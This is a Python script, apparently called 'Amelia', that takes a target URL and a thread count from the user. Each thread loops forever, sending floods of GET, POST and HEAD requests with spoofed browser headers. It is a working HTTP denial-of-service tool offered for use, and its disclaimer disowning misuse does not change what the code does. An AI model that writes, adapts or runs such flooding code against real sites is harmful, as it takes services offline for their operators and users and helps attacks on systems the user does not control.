# usr/bin/env python

import grequests
import subprocess
from threading import Thread
from colorama import init, Fore
from fake_headers import Headers


class Main:

    def __init__(self):
        self.url = []
        self.headers = Headers()

        # Colorama
        init()
        self.clear_console()
        self.RED, self.GREEN = Fore.RED, Fore.GREEN
        self.MAGENTA, self.YELLOW = Fore.MAGENTA, Fore.YELLOW

        # Logotext
        print(f"""{self.MAGENTA}
        █████████████████████████████████████
        ██▀▄─██▄─▀█▀─▄█▄─▄▄─█▄─▄███▄─▄██▀▄─██
        ██─▀─███─█▄█─███─▄█▀██─██▀██─███─▀─██
        ▀▄▄▀▄▄▀▄▄▄▀▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▀▄▄▀▄▄▀{self.GREEN}
        [+] This script was made by user AXL033
        [+] I am not responsible for your actions with the script
        [+] All copyrights reserved, distribution in another's name is prohibited\n""")

        # Getting the informations
        self.url.append(input(f"{self.YELLOW}[?] URL: "))
        self.Thread = int(input(f"{self.YELLOW}[?] Threads count: "))
        self.check_data()

    def check_data(self):
        if "http" not in self.url[0]:
            exit(f"{self.RED}[-] Incorrect reference")
        else:
            try:
                self.Thread = int(self.Thread)
            except:
                exit(f"{self.RED}[-] Incorrect number of threads")
            else:
                # Call method
                self.start_thread()

    def flooding(self):
        while True:
            # Trying sending get, post, head requests
            try:
                print(f"{self.MAGENTA}[+] Amelia say: {grequests.map((grequests.get(u, timeout=5, headers=self.headers.generate()) for u in self.url))}")
                print(f"{self.MAGENTA}[+] Amelia say: {grequests.map((grequests.post(u, timeout=5, headers=self.headers.generate()) for u in self.url))}")
                print(f"{self.MAGENTA}[+] Amelia say: {grequests.map((grequests.head(u, timeout=5, headers=self.headers.generate()) for u in self.url))}")
            except:
                pass

    def start_thread(self):
        # Opening threads
        for thread in range(self.Thread):
            # Thread starting
            Thread(target=self.flooding).start()
            print(f"{self.GREEN}[+] Thread is {thread + 1} opened!")

    def clear_console(self):
        try:
            # WIndows
            subprocess.call(["cls"], shell=1)
        except:
            # Linux, Mac
            subprocess.call(["clear"], shell=1)


# Creating instance
if __name__ == "__main__":
    Main()

"""This script was developed by user AXL033.
Please don't use the script for bad intentions,
we don't encourage you to do it, we want to keep
you out of it. But in any case you should remember
that you are responsible for all your actions."""